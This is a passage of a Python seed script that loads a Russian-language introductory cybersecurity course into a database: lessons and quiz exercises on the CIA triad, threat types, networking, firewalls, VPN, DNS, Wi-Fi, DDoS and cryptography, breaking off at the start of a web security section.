"""Seed: Кибербезопасность — основы — 7 sections, ~38 lessons."""
import asyncio
import uuid
from sqlalchemy import select
from app.database import async_session
from app.models.user import User
from app.models.course import Course, CourseSection, CourseLesson

SNAKE_X = [0.50, 0.75, 0.50, 0.25, 0.50]
CANVAS_W, ROW_H, V_PAD = 500, 148, 90

T = "Кибербезопасность — основы"
DESC = (
    "Основы кибербезопасности: сетевая безопасность, криптография, OWASP Top 10, "
    "пентестинг, социальная инженерия, защита данных."
)

S = [
    # ===== SECTION 1: Введение в кибербезопасность =====
    {
        "title": "Введение в кибербезопасность",
        "pos": 0,
        "lessons": [
            {
                "t": "Что такое информационная безопасность",
                "xp": 20,
                "steps": [
                    {"type": "info", "title": "InfoSec — основы", "markdown": "## Что такое информационная безопасность?\n\n**Информационная безопасность (InfoSec)** — это практика защиты информации от несанкционированного доступа, использования, раскрытия, нарушения, модификации или уничтожения.\n\n### Почему это важно?\n- В 2025 году ущерб от киберпреступлений превысил **10 трлн $** в год\n- Каждые 39 секунд происходит кибератака\n- 95% утечек данных вызваны человеческим фактором\n\n### Ключевые области InfoSec:\n- **Сетевая безопасность** — защита сетевой инфраструктуры\n- **Безопасность приложений** — защита ПО от уязвимостей\n- **Безопасность данных** — шифрование и контроль доступа\n- **Операционная безопасность** — процессы и решения по защите данных\n- **Аварийное восстановление** — планы на случай инцидентов\n\n### Кибербезопасность vs InfoSec:\n```\nInfoSec = защита ЛЮБОЙ информации (бумага, цифра)\nКибербезопасность = защита ЦИФРОВОЙ информации и систем\n```"},
                    {"type": "quiz", "question": "Что такое InfoSec?", "options": [{"id": "a", "text": "Практика защиты информации от несанкционированного доступа", "correct": True}, {"id": "b", "text": "Программа для антивирусной защиты", "correct": False}, {"id": "c", "text": "Методология разработки ПО", "correct": False}, {"id": "d", "text": "Протокол сетевого взаимодействия", "correct": False}]},
                    {"type": "true-false", "statement": "Кибербезопасность и информационная безопасность — это одно и то же.", "correct": False},
                    {"type": "flashcards", "cards": [{"front": "InfoSec", "back": "Защита информации от несанкционированного доступа, использования и раскрытия"}, {"front": "Кибербезопасность", "back": "Защита цифровой информации и компьютерных систем от кибератак"}, {"front": "Операционная безопасность (OPSEC)", "back": "Процессы и решения по управлению и защите данных"}, {"front": "Аварийное восстановление", "back": "Планы реагирования на инциденты и восстановления систем"}]},
                ],
            },
            {
                "t": "CIA триада",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Конфиденциальность, целостность, доступность", "markdown": "## CIA триада\n\nТри основных принципа информационной безопасности:\n\n### 1. Конфиденциальность (Confidentiality)\nИнформация доступна только авторизованным пользователям.\n- Шифрование данных\n- Контроль доступа\n- Аутентификация\n\n### 2. Целостность (Integrity)\nДанные не изменены несанкционированно.\n- Хеш-суммы (SHA-256)\n- Цифровые подписи\n- Контроль версий\n\n### 3. Доступность (Availability)\nСистемы и данные доступны, когда нужны.\n- Резервное копирование\n- Отказоустойчивость\n- DDoS-защита\n\n### Примеры атак на CIA:\n| Принцип | Атака | Пример |\n|---------|-------|--------|\n| Конфиденциальность | Перехват данных | Man-in-the-middle |\n| Целостность | Подмена данных | SQL injection |\n| Доступность | Отказ в обслуживании | DDoS-атака |"},
                    {"type": "matching", "pairs": [{"left": "Конфиденциальность", "right": "Данные доступны только авторизованным лицам"}, {"left": "Целостность", "right": "Данные не изменены без разрешения"}, {"left": "Доступность", "right": "Системы работают, когда нужны"}, {"left": "DDoS", "right": "Атака на доступность"}]},
                    {"type": "category-sort", "categories": [{"name": "Конфиденциальность", "items": ["Шифрование", "Контроль доступа"]}, {"name": "Целостность", "items": ["Хеш-суммы", "Цифровые подписи"]}, {"name": "Доступность", "items": ["Резервное копирование", "DDoS-защита"]}]},
                    {"type": "fill-blank", "sentence": "CIA триада состоит из конфиденциальности, целостности и ___.", "answer": "доступности"},
                ],
            },
            {
                "t": "Типы угроз",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Классификация киберугроз", "markdown": "## Типы киберугроз\n\n### По источнику:\n- **Внешние** — хакеры, конкуренты, государства\n- **Внутренние** — недовольные сотрудники, халатность\n\n### По типу воздействия:\n\n#### Вредоносное ПО (Malware):\n- **Вирусы** — прикрепляются к файлам, требуют действия пользователя\n- **Черви** — распространяются самостоятельно по сети\n- **Трояны** — маскируются под легитимное ПО\n- **Ransomware** — шифрует файлы, требует выкуп\n- **Spyware** — шпионит за пользователем\n\n#### Сетевые атаки:\n- **DDoS** — перегрузка сервера запросами\n- **Man-in-the-Middle** — перехват трафика\n- **DNS Spoofing** — подмена DNS-записей\n\n#### Атаки на приложения:\n- **SQL Injection** — внедрение SQL-кода\n- **XSS** — внедрение JavaScript\n- **CSRF** — подделка запросов\n\n### Пример Ransomware:\n```\nWannaCry (2017): заразил 300 000 компьютеров в 150 странах\nУщерб: ~4 млрд $\nВектор: уязвимость EternalBlue в Windows SMB\n```"},
                    {"type": "quiz", "question": "Какой тип вредоносного ПО шифрует файлы и требует выкуп?", "options": [{"id": "a", "text": "Вирус", "correct": False}, {"id": "b", "text": "Червь", "correct": False}, {"id": "c", "text": "Ransomware", "correct": True}, {"id": "d", "text": "Spyware", "correct": False}]},
                    {"type": "multi-select", "question": "Какие из этих типов относятся к вредоносному ПО (malware)?", "options": [{"id": "a", "text": "Трояны", "correct": True}, {"id": "b", "text": "Ransomware", "correct": True}, {"id": "c", "text": "DDoS", "correct": False}, {"id": "d", "text": "Черви", "correct": True}, {"id": "e", "text": "SQL Injection", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "Вирус", "right": "Прикрепляется к файлам, требует действия пользователя"}, {"left": "Червь", "right": "Распространяется самостоятельно по сети"}, {"left": "Троян", "right": "Маскируется под легитимное ПО"}, {"left": "Ransomware", "right": "Шифрует файлы и требует выкуп"}]},
                ],
            },
            {
                "t": "Хакеры: white, black, grey hat",
                "xp": 20,
                "steps": [
                    {"type": "info", "title": "Типы хакеров", "markdown": "## Типы хакеров\n\n### White Hat (белые шляпы)\n- **Этичные хакеры** — работают легально\n- Проводят пентесты по контракту\n- Ищут уязвимости для их исправления\n- Bug bounty программы\n- Примеры: специалисты по ИБ, пентестеры\n\n### Black Hat (чёрные шляпы)\n- **Киберпреступники** — действуют незаконно\n- Взламывают системы для выгоды\n- Крадут данные, распространяют malware\n- Мотивация: деньги, месть, идеология\n\n### Grey Hat (серые шляпы)\n- Действуют **без разрешения**, но без злого умысла\n- Находят уязвимость → сообщают владельцу\n- Иногда публикуют информацию публично\n- Юридически — всё ещё незаконно\n\n### Другие категории:\n- **Script Kiddies** — используют готовые инструменты без глубоких знаний\n- **Hacktivists** — хакеры с политическими мотивами (Anonymous)\n- **State-sponsored** — хакеры, спонсируемые государством (APT-группы)\n\n### Bug Bounty платформы:\n- HackerOne\n- Bugcrowd\n- Synack"},
                    {"type": "category-sort", "categories": [{"name": "White Hat", "items": ["Легальный пентест", "Bug Bounty"]}, {"name": "Black Hat", "items": ["Кража данных", "Распространение malware"]}, {"name": "Grey Hat", "items": ["Взлом без разрешения без злого умысла", "Публикация уязвимостей"]}]},
                    {"type": "true-false", "statement": "Grey Hat хакеры действуют без разрешения, но их действия полностью легальны.", "correct": False},
                    {"type": "quiz", "question": "Как называют хакеров, которые используют готовые инструменты без глубоких знаний?", "options": [{"id": "a", "text": "White Hat", "correct": False}, {"id": "b", "text": "Script Kiddies", "correct": True}, {"id": "c", "text": "Hacktivists", "correct": False}, {"id": "d", "text": "Grey Hat", "correct": False}]},
                ],
            },
            {
                "t": "Карьера в информационной безопасности",
                "xp": 20,
                "steps": [
                    {"type": "info", "title": "Профессии и сертификации в ИБ", "markdown": "## Карьера в ИБ\n\n### Популярные роли:\n- **SOC Analyst** — мониторинг и реагирование на инциденты\n- **Penetration Tester** — поиск уязвимостей\n- **Security Engineer** — проектирование защиты\n- **Security Architect** — архитектура безопасности\n- **CISO** — директор по ИБ\n- **Forensics Analyst** — расследование инцидентов\n\n### Ключевые сертификации:\n| Сертификация | Уровень | Фокус |\n|---|---|---|\n| CompTIA Security+ | Начальный | Основы ИБ |\n| CEH | Средний | Этичный хакинг |\n| OSCP | Продвинутый | Практический пентест |\n| CISSP | Эксперт | Управление ИБ |\n\n### Путь развития:\n```\nJunior SOC Analyst → SOC Analyst → Senior Analyst →\n→ Security Engineer → Security Architect → CISO\n```\n\n### Средние зарплаты (мировые):\n- SOC Analyst: $55,000–75,000\n- Pentester: $80,000–120,000\n- Security Architect: $130,000–180,000\n- CISO: $200,000+"},
                    {"type": "drag-order", "items": ["Junior SOC Analyst", "SOC Analyst", "Senior Security Analyst", "Security Engineer", "Security Architect", "CISO"]},
                    {"type": "matching", "pairs": [{"left": "CompTIA Security+", "right": "Начальный уровень, основы ИБ"}, {"left": "CEH", "right": "Средний уровень, этичный хакинг"}, {"left": "OSCP", "right": "Продвинутый, практический пентест"}, {"left": "CISSP", "right": "Экспертный, управление ИБ"}]},
                    {"type": "quiz", "question": "Какая сертификация фокусируется на практическом пентестинге?", "options": [{"id": "a", "text": "CompTIA Security+", "correct": False}, {"id": "b", "text": "CISSP", "correct": False}, {"id": "c", "text": "OSCP", "correct": True}, {"id": "d", "text": "CEH", "correct": False}]},
                ],
            },
        ],
    },
    # ===== SECTION 2: Сетевая безопасность =====
    {
        "title": "Сетевая безопасность",
        "pos": 1,
        "lessons": [
            {
                "t": "Основы TCP/IP",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Модель TCP/IP и сетевые протоколы", "markdown": "## Основы TCP/IP\n\n### Модель TCP/IP (4 уровня):\n\n| Уровень | Протоколы | Назначение |\n|---------|-----------|------------|\n| Прикладной | HTTP, FTP, DNS, SMTP | Взаимодействие с пользователем |\n| Транспортный | TCP, UDP | Доставка данных |\n| Сетевой | IP, ICMP | Маршрутизация |\n| Канальный | Ethernet, Wi-Fi | Физическая передача |\n\n### TCP vs UDP:\n- **TCP** — надёжный, с подтверждением (HTTP, SSH, Email)\n- **UDP** — быстрый, без подтверждения (DNS, VoIP, стриминг)\n\n### Важные порты:\n```\n22  — SSH\n25  — SMTP\n53  — DNS\n80  — HTTP\n443 — HTTPS\n3389 — RDP\n```\n\n### Трёхстороннее рукопожатие TCP:\n```\nКлиент → SYN → Сервер\nКлиент ← SYN-ACK ← Сервер\nКлиент → ACK → Сервер\n→ Соединение установлено!\n```"},
                    {"type": "matching", "pairs": [{"left": "Порт 22", "right": "SSH"}, {"left": "Порт 80", "right": "HTTP"}, {"left": "Порт 443", "right": "HTTPS"}, {"left": "Порт 53", "right": "DNS"}]},
                    {"type": "drag-order", "items": ["Клиент отправляет SYN", "Сервер отвечает SYN-ACK", "Клиент отправляет ACK", "Соединение установлено"]},
                    {"type": "quiz", "question": "Какой протокол обеспечивает надёжную доставку данных с подтверждением?", "options": [{"id": "a", "text": "UDP", "correct": False}, {"id": "b", "text": "TCP", "correct": True}, {"id": "c", "text": "ICMP", "correct": False}, {"id": "d", "text": "ARP", "correct": False}]},
                ],
            },
            {
                "t": "Файрволы",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Файрволы и правила фильтрации", "markdown": "## Файрволы (Firewalls)\n\nФайрвол — сетевое устройство или ПО, контролирующее входящий и исходящий трафик.\n\n### Типы файрволов:\n- **Пакетный фильтр** — проверяет заголовки пакетов (IP, порт)\n- **Stateful firewall** — отслеживает состояние соединений\n- **WAF (Web Application Firewall)** — защищает веб-приложения\n- **NGFW (Next-Gen Firewall)** — глубокая инспекция пакетов (DPI)\n\n### Примеры правил iptables (Linux):\n```bash\n# Разрешить SSH\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\n\n# Разрешить HTTP и HTTPS\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n\n# Заблокировать всё остальное\niptables -A INPUT -j DROP\n```\n\n### DMZ (Демилитаризованная зона):\n```\nИнтернет → [Внешний FW] → DMZ (веб-серверы) → [Внутренний FW] → LAN\n```\n\n### Принцип наименьших привилегий:\nЗапретить всё по умолчанию, разрешить только необходимое."},
                    {"type": "quiz", "question": "Какой тип файрвола специально предназначен для защиты веб-приложений?", "options": [{"id": "a", "text": "Пакетный фильтр", "correct": False}, {"id": "b", "text": "WAF", "correct": True}, {"id": "c", "text": "Stateful firewall", "correct": False}, {"id": "d", "text": "NAT", "correct": False}]},
                    {"type": "code-puzzle", "instructions": "Составьте правила iptables: разрешить HTTPS, заблокировать остальное:", "correctOrder": ["iptables -A INPUT -p tcp --dport 443 -j ACCEPT", "iptables -A INPUT -j DROP"]},
                    {"type": "true-false", "statement": "Принцип наименьших привилегий означает: запретить всё по умолчанию, разрешить только необходимое.", "correct": True},
                    {"type": "fill-blank", "sentence": "DMZ расшифровывается как ___ зона.", "answer": "демилитаризованная"},
                ],
            },
            {
                "t": "VPN и туннелирование",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "VPN — виртуальная частная сеть", "markdown": "## VPN (Virtual Private Network)\n\nVPN создаёт зашифрованный туннель между устройством и сервером.\n\n### Как работает VPN:\n```\n[Ваш ПК] → зашифрованный туннель → [VPN-сервер] → Интернет\n```\n\n### Типы VPN:\n- **Remote Access VPN** — подключение сотрудника к корпоративной сети\n- **Site-to-Site VPN** — соединение двух офисов\n- **SSL/TLS VPN** — через браузер (OpenVPN)\n- **IPSec VPN** — на сетевом уровне\n\n### Протоколы:\n| Протокол | Безопасность | Скорость |\n|----------|-------------|----------|\n| WireGuard | Высокая | Очень быстрый |\n| OpenVPN | Высокая | Средняя |\n| IKEv2 | Высокая | Быстрый |\n| L2TP/IPSec | Средняя | Средняя |\n| PPTP | Низкая ❌ | Быстрый |\n\n### Зачем нужен VPN:\n- Защита в публичных Wi-Fi\n- Доступ к корпоративной сети\n- Обход гео-ограничений\n- Конфиденциальность трафика"},
                    {"type": "quiz", "question": "Какой VPN-протокол считается устаревшим и небезопасным?", "options": [{"id": "a", "text": "WireGuard", "correct": False}, {"id": "b", "text": "OpenVPN", "correct": False}, {"id": "c", "text": "PPTP", "correct": True}, {"id": "d", "text": "IKEv2", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "Remote Access VPN", "right": "Подключение сотрудника к корпоративной сети"}, {"left": "Site-to-Site VPN", "right": "Соединение двух офисов"}, {"left": "WireGuard", "right": "Современный быстрый протокол"}, {"left": "PPTP", "right": "Устаревший небезопасный протокол"}]},
                    {"type": "true-false", "statement": "VPN полностью скрывает все ваши действия в интернете от всех.", "correct": False},
                ],
            },
            {
                "t": "DNS и безопасность",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "DNS и атаки на DNS", "markdown": "## DNS — система доменных имён\n\n### Как работает DNS:\n```\nВы вводите: google.com\nDNS-резолвер → корневой сервер → .com сервер → google.com NS\n→ Ответ: 142.250.74.206\n```\n\n### Типы DNS-записей:\n| Тип | Назначение | Пример |\n|-----|-----------|--------|\n| A | IPv4 адрес | 93.184.216.34 |\n| AAAA | IPv6 адрес | 2606:2800:220:1:... |\n| CNAME | Псевдоним | www → example.com |\n| MX | Почтовый сервер | mail.example.com |\n| TXT | Текстовая запись | SPF, DKIM |\n\n### Атаки на DNS:\n- **DNS Spoofing** — подмена DNS-ответов\n- **DNS Cache Poisoning** — отравление кэша резолвера\n- **DNS Tunneling** — передача данных через DNS\n- **DNS Amplification** — DDoS с усилением через DNS\n\n### Защита:\n- **DNSSEC** — цифровые подписи для DNS\n- **DNS over HTTPS (DoH)** — шифрование DNS-запросов\n- **DNS over TLS (DoT)** — TLS для DNS"},
                    {"type": "multi-select", "question": "Какие из этих атак направлены на DNS?", "options": [{"id": "a", "text": "DNS Spoofing", "correct": True}, {"id": "b", "text": "XSS", "correct": False}, {"id": "c", "text": "DNS Cache Poisoning", "correct": True}, {"id": "d", "text": "DNS Tunneling", "correct": True}, {"id": "e", "text": "SQL Injection", "correct": False}]},
                    {"type": "matching", "pairs": [{"left": "A-запись", "right": "IPv4 адрес домена"}, {"left": "MX-запись", "right": "Почтовый сервер"}, {"left": "CNAME", "right": "Псевдоним домена"}, {"left": "TXT", "right": "SPF, DKIM и другой текст"}]},
                    {"type": "fill-blank", "sentence": "___ — технология, которая добавляет цифровые подписи к DNS-записям для защиты от подмены.", "answer": "DNSSEC"},
                    {"type": "type-answer", "question": "Как называется метод шифрования DNS-запросов через HTTPS?", "acceptedAnswers": ["DoH", "DNS over HTTPS"]},
                ],
            },
            {
                "t": "Безопасность Wi-Fi",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Протоколы защиты Wi-Fi", "markdown": "## Безопасность Wi-Fi\n\n### Эволюция протоколов:\n| Протокол | Год | Безопасность |\n|----------|-----|--------------|\n| WEP | 1997 | Взломан ❌ |\n| WPA | 2003 | Уязвим ❌ |\n| WPA2 | 2004 | Стандарт ✓ |\n| WPA3 | 2018 | Лучший ✓✓ |\n\n### Атаки на Wi-Fi:\n- **Evil Twin** — поддельная точка доступа\n- **Deauth Attack** — принудительное отключение клиентов\n- **KRACK** — атака на WPA2 (2017)\n- **Packet Sniffing** — перехват трафика в открытых сетях\n\n### Рекомендации:\n1. Используйте **WPA3** или **WPA2** с сильным паролем\n2. Отключите **WPS** — уязвим к brute force\n3. Скройте SSID (не панацея)\n4. Используйте VPN в публичных сетях\n5. Включите MAC-фильтрацию (обходится, но добавляет уровень)\n\n### Инструменты аудита:\n```\naircrack-ng — анализ Wi-Fi\nwireshark — перехват и анализ пакетов\nkismet — обнаружение беспроводных сетей\n```"},
                    {"type": "drag-order", "items": ["WEP (1997) — взломан", "WPA (2003) — уязвим", "WPA2 (2004) — стандарт", "WPA3 (2018) — лучшая защита"]},
                    {"type": "quiz", "question": "Какая атака создаёт поддельную Wi-Fi точку доступа?", "options": [{"id": "a", "text": "Evil Twin", "correct": True}, {"id": "b", "text": "KRACK", "correct": False}, {"id": "c", "text": "SQL Injection", "correct": False}, {"id": "d", "text": "Brute Force", "correct": False}]},
                    {"type": "true-false", "statement": "WPS (Wi-Fi Protected Setup) рекомендуется оставлять включённым для удобства.", "correct": False},
                ],
            },
            {
                "t": "DDoS-атаки и защита",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "DDoS — распределённый отказ в обслуживании", "markdown": "## DDoS-атаки\n\n**DDoS (Distributed Denial of Service)** — атака, при которой тысячи устройств одновременно отправляют запросы на целевой сервер.\n\n### Типы DDoS:\n\n#### Volumetric (объёмные):\n- **UDP Flood** — засыпание UDP-пакетами\n- **DNS Amplification** — усиление через DNS-серверы\n- **NTP Amplification** — усиление через NTP-серверы\n\n#### Protocol (протокольные):\n- **SYN Flood** — отправка SYN без завершения рукопожатия\n- **Ping of Death** — oversized ICMP-пакеты\n\n#### Application Layer (прикладной уровень):\n- **HTTP Flood** — множество HTTP-запросов\n- **Slowloris** — медленные соединения, исчерпание лимита\n\n### Защита:\n- **CDN** (Cloudflare, Akamai) — распределение нагрузки\n- **Rate Limiting** — ограничение запросов\n- **Anycast** — распределение трафика по серверам\n- **WAF** — фильтрация вредоносных запросов\n- **Black Hole Routing** — перенаправление атакующего трафика\n\n### Масштабы:\nРекордная DDoS-атака: >3.4 Тбит/с (2023)"},
                    {"type": "category-sort", "categories": [{"name": "Volumetric", "items": ["UDP Flood", "DNS Amplification"]}, {"name": "Protocol", "items": ["SYN Flood", "Ping of Death"]}, {"name": "Application Layer", "items": ["HTTP Flood", "Slowloris"]}]},
                    {"type": "quiz", "question": "Какой тип DDoS-атаки открывает TCP-соединения, не завершая рукопожатие?", "options": [{"id": "a", "text": "HTTP Flood", "correct": False}, {"id": "b", "text": "SYN Flood", "correct": True}, {"id": "c", "text": "DNS Amplification", "correct": False}, {"id": "d", "text": "Slowloris", "correct": False}]},
                    {"type": "multi-select", "question": "Какие методы помогают защититься от DDoS?", "options": [{"id": "a", "text": "CDN (Cloudflare)", "correct": True}, {"id": "b", "text": "Rate Limiting", "correct": True}, {"id": "c", "text": "Отключение файрвола", "correct": False}, {"id": "d", "text": "WAF", "correct": True}, {"id": "e", "text": "Использование HTTP вместо HTTPS", "correct": False}]},
                ],
            },
        ],
    },
    # ===== SECTION 3: Криптография =====
    {
        "title": "Криптография",
        "pos": 2,
        "lessons": [
            {
                "t": "Симметричное и асимметричное шифрование",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "Два типа шифрования", "markdown": "## Симметричное vs Асимметричное шифрование\n\n### Симметричное шифрование\nОдин ключ для шифрования и расшифровки.\n\n```\nТекст + Ключ → [Шифрование] → Шифротекст\nШифротекст + Ключ → [Расшифровка] → Текст\n```\n\n**Алгоритмы:** AES-256, ChaCha20, 3DES\n\n**Плюсы:** Быстрое, эффективное\n**Минусы:** Проблема обмена ключами\n\n### Асимметричное шифрование\nПара ключей: публичный и приватный.\n\n```\nТекст + Публичный ключ → [Шифрование] → Шифротекст\nШифротекст + Приватный ключ → [Расшифровка] → Текст\n```\n\n**Алгоритмы:** RSA, ECC, Ed25519\n\n**Плюсы:** Безопасный обмен ключами\n**Минусы:** Медленнее симметричного\n\n### Гибридный подход (TLS):\n1. Асимметричное шифрование для обмена сессионным ключом\n2. Симметричное шифрование для передачи данных\n\n```\nRSA/ECDH → обмен AES-ключом → AES шифрует данные\n```"},
                    {"type": "category-sort", "categories": [{"name": "Симметричное", "items": ["AES-256", "Один ключ", "Быстрое"]}, {"name": "Асимметричное", "items": ["RSA", "Пара ключей", "Безопасный обмен"]}]},
                    {"type": "quiz", "question": "Какой подход используется в TLS для обмена ключами?", "options": [{"id": "a", "text": "Только симметричное", "correct": False}, {"id": "b", "text": "Только асимметричное", "correct": False}, {"id": "c", "text": "Гибридный (оба типа)", "correct": True}, {"id": "d", "text": "Никакое шифрование", "correct": False}]},
                    {"type": "fill-blank", "sentence": "В асимметричном шифровании используется пара ключей: публичный и ___.", "answer": "приватный"},
                    {"type": "true-false", "statement": "AES-256 — это алгоритм асимметричного шифрования.", "correct": False},
                ],
            },
            {
                "t": "Хеширование",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Хеш-функции и их применение", "markdown": "## Хеширование\n\nХеш-функция — односторонняя функция, превращающая данные любого размера в строку фиксированной длины.\n\n### Свойства хеш-функции:\n1. **Детерминизм** — одни и те же данные → одинаковый хеш\n2. **Быстрота** — вычисление за миллисекунды\n3. **Необратимость** — нельзя восстановить данные из хеша\n4. **Лавинный эффект** — малое изменение → совсем другой хеш\n5. **Устойчивость к коллизиям** — сложно найти два входа с одинаковым хешем\n\n### Популярные алгоритмы:\n| Алгоритм | Длина | Статус |\n|----------|-------|--------|\n| MD5 | 128 бит | Небезопасен ❌ |\n| SHA-1 | 160 бит | Небезопасен ❌ |\n| SHA-256 | 256 бит | Безопасен ✓ |\n| SHA-3 | 256+ бит | Безопасен ✓ |\n| bcrypt | - | Для паролей ✓ |\n\n### Пример (Python):\n```python\nimport hashlib\n\ntext = \"Hello, World!\"\nhash_hex = hashlib.sha256(text.encode()).hexdigest()\nprint(hash_hex)\n# dffd6021bb2bd5b0af676290809ec3a53191dd81c7f70a4b28688a362182986f\n```\n\n### Применение:\n- Хранение паролей (bcrypt, Argon2)\n- Проверка целостности файлов\n- Цифровые подписи\n- Блокчейн"},
                    {"type": "quiz", "question": "Какой алгоритм хеширования рекомендуется для хранения паролей?", "options": [{"id": "a", "text": "MD5", "correct": False}, {"id": "b", "text": "SHA-1", "correct": False}, {"id": "c", "text": "bcrypt", "correct": True}, {"id": "d", "text": "Base64", "correct": False}]},
                    {"type": "multi-select", "question": "Какие свойства должна иметь хорошая хеш-функция?", "options": [{"id": "a", "text": "Необратимость", "correct": True}, {"id": "b", "text": "Обратимость", "correct": False}, {"id": "c", "text": "Лавинный эффект", "correct": True}, {"id": "d", "text": "Устойчивость к коллизиям", "correct": True}, {"id": "e", "text": "Медленное вычисление", "correct": False}]},
                    {"type": "true-false", "statement": "MD5 всё ещё считается безопасным алгоритмом для хеширования паролей.", "correct": False},
                ],
            },
            {
                "t": "SSL/TLS",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "SSL/TLS — защита соединений", "markdown": "## SSL/TLS\n\n**TLS (Transport Layer Security)** — протокол шифрования для безопасной передачи данных.\n\n### Эволюция:\n- SSL 2.0, 3.0 — **устарели** ❌\n- TLS 1.0, 1.1 — **устарели** ❌\n- TLS 1.2 — **допустимо** ✓\n- TLS 1.3 — **рекомендуется** ✓✓\n\n### TLS Handshake (упрощённо):\n```\n1. Client Hello (поддерживаемые алгоритмы)\n2. Server Hello (выбранный алгоритм + сертификат)\n3. Обмен ключами (ECDHE)\n4. Обе стороны вычисляют сессионный ключ\n5. Шифрованная передача данных (AES-256)\n```\n\n### TLS 1.3 vs 1.2:\n- 1 RTT вместо 2 RTT (быстрее)\n- Убраны устаревшие алгоритмы\n- Forward Secrecy обязателен\n- Зашифрованные сертификаты\n\n### HTTPS:\n```\nHTTPS = HTTP + TLS\nhttp://example.com  → не зашифрован ❌\nhttps://example.com → зашифрован ✓\n```\n\n### Проверка сертификата:\n```bash\nopenssl s_client -connect example.com:443\n```"},
                    {"type": "drag-order", "items": ["Client Hello — клиент предлагает алгоритмы", "Server Hello — сервер выбирает алгоритм и отправляет сертификат", "Обмен ключами (ECDHE)", "Вычисление сессионного ключа", "Начало зашифрованной передачи данных"]},
                    {"type": "quiz", "question": "Какая версия TLS рекомендуется к использованию сегодня?", "options": [{"id": "a", "text": "SSL 3.0", "correct": False}, {"id": "b", "text": "TLS 1.0", "correct": False}, {"id": "c", "text": "TLS 1.2", "correct": False}, {"id": "d", "text": "TLS 1.3", "correct": True}]},
                    {"type": "fill-blank", "sentence": "HTTPS — это протокол HTTP, защищённый с помощью ___.", "answer": "TLS"},
                    {"type": "true-false", "statement": "TLS 1.3 требует больше раундов рукопожатия, чем TLS 1.2.", "correct": False},
                ],
            },
            {
                "t": "PKI и сертификаты",
                "xp": 30,
                "steps": [
                    {"type": "info", "title": "Инфраструктура открытых ключей", "markdown": "## PKI (Public Key Infrastructure)\n\nPKI — система управления цифровыми сертификатами и ключами.\n\n### Компоненты PKI:\n- **CA (Certificate Authority)** — удостоверяющий центр (Let's Encrypt, DigiCert)\n- **RA (Registration Authority)** — регистрационный центр\n- **Сертификат X.509** — содержит публичный ключ, информацию о владельце, подпись CA\n- **CRL/OCSP** — списки отозванных сертификатов\n\n### Как работает:\n```\n1. Сервер генерирует пару ключей\n2. Создаёт CSR (Certificate Signing Request)\n3. CA проверяет владельца\n4. CA подписывает сертификат\n5. Сервер устанавливает сертификат\n6. Браузер проверяет цепочку доверия\n```\n\n### Цепочка доверия:\n```\nRoot CA → Intermediate CA → Сертификат сайта\n```\n\n### Let's Encrypt:\n- Бесплатные сертификаты\n- Автоматическое обновление\n- Certbot для автоматизации\n```bash\nsudo certbot --nginx -d example.com\n```"},
                    {"type": "matching", "pairs": [{"left": "CA", "right": "Удостоверяющий центр, подписывает сертификаты"}, {"left": "CSR", "right": "Запрос на подпись сертификата"}, {"left": "X.509", "right": "Стандарт цифровых сертификатов"}, {"left": "CRL", "right": "Список отозванных сертификатов"}]},
                    {"type": "drag-order", "items": ["Генерация пары ключей", "Создание CSR", "CA проверяет владельца", "CA подписывает сертификат", "Установка сертификата на сервер"]},
                    {"type": "quiz", "question": "Какой сервис предоставляет бесплатные SSL/TLS сертификаты?", "options": [{"id": "a", "text": "DigiCert", "correct": False}, {"id": "b", "text": "Let's Encrypt", "correct": True}, {"id": "c", "text": "Verisign", "correct": False}, {"id": "d", "text": "Symantec", "correct": False}]},
                ],
            },
            {
                "t": "Цифровые подписи",
                "xp": 25,
                "steps": [
                    {"type": "info", "title": "Цифровые подписи — подлинность и целостность", "markdown": "## Цифровые подписи\n\nЦифровая подпись — криптографический механизм проверки подлинности и целостности данных.\n\n### Как работает:\n```\nПодписание:\n1. Вычисляем хеш документа (SHA-256)\n2. Шифруем хеш приватным ключом → подпись\n\nПроверка:\n1. Расшифровываем подпись публичным ключом → хеш₁\n2. Вычисляем хеш документа → хеш₂\n3. Если хеш₁ == хеш₂ → подпись валидна ✓\n```\n\n### Что гарантирует:\n- **Подлинность** — документ от указанного автора\n- **Целостность** — документ не изменён\n- **Неотказуемость** — автор не может отрицать авторство\n\n### Применение:\n- Подписание ПО (code signing)\n- Электронные документы\n- Email (PGP/GPG)\n- Блокчейн-транзакции\n- Git commits (GPG подписи)\n\n### Пример GPG:\n```bash\n# Подписать файл\ngpg --sign document.pdf\n\n# Проверить подпись\ngpg --verify document.pdf.gpg\n```"},
                    {"type": "drag-order", "items": ["Вычислить хеш документа", "Зашифровать хеш приватным ключом", "Отправить документ и подпись", "Получатель расшифровывает подпись публичным ключом", "Сравнить хеши для проверки"]},
                    {"type": "multi-select", "question": "Что гарантирует цифровая подпись?", "options": [{"id": "a", "text": "Подлинность автора", "correct": True}, {"id": "b", "text": "Целостность документа", "correct": True}, {"id": "c", "text": "Конфиденциальность содержимого", "correct": False}, {"id": "d", "text": "Неотказуемость", "correct": True}]},
                    {"type": "true-false", "statement": "Цифровая подпись шифрует содержимое документа для конфиденциальности.", "correct": False},
                ],
            },
        ],
    },
    # ===== SECTION 4: Веб-безопасность =====
    {
        "title": "Веб-безопасность",
        "pos": 3,
        "lessons": [
            {
                "t": "OWASP Top 10",
                "xp": 30,
                "steps": [
